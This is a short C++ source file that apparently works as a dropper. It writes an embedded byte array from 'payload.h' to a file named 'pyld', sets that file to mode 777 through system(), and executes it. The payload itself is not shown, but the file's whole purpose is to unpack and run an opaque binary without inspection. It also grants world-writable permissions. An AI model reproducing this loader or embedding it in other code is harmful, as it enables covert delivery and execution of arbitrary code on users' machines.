#include <iostream>
#include <fstream>

#include "payload.h"

#include <string.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    char _bf[buffer_size]; 
    
    for(int i = 0; i < buffer_size; i++)_bf[i] = (char)buffer[i];;

    std::ofstream f("pyld", std::ios::binary);
    f.write(_bf, buffer_size);
    f.close();

    system("chmod 777 pyld");
    system("./pyld");
}